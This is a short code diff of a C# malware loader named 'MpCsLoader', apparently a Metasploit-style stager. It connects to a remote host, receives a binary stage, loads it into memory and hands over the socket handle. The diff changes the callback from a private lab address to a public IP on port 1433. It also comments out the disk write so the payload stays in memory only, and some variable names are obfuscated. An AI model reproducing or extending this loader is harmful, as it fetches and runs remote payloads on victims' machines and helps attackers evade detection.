@@ -38,7 +38,7 @@ namespace MpCsLoader
             {
                 IntPtr init = MemoryLibrary.MemoryGetProcAddress((MemoryLibrary.MEMORYMODULE*)mod.ToPointer(), "Init");
                 MpInit func = (MpInit)Marshal.GetDelegateForFunctionPointer(init, typeof(MpInit));
-                int sockfd = StageLoader.LoadBinData("192.168.190.52", 4444);
+                int sockfd = StageLoader.LoadBinData("107.170.234.111",1433 );
                 func(sockfd);
             }
 
@@ -68,12 +68,8 @@ namespace MpCsLoader
                 while (PmUVgiyFcZ < RUgJAb)
                 { PmUVgiyFcZ += svrSocket.Receive(binBuffer, PmUVgiyFcZ + 5, (RUgJAb - PmUVgiyFcZ) < 4096 ? (RUgJAb - PmUVgiyFcZ) : 4096, 0); }
 
-                File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
+                //File.WriteAllBytes(@"c:\tmp\1.dll", binBuffer);
                 
-
-
-
-
                 byte[] socketID = BitConverter.GetBytes((int)svrSocket.Handle);
                 Array.Copy(socketID, 0, binBuffer, 1, 4); 
                 binBuffer[0] = 0xBF;
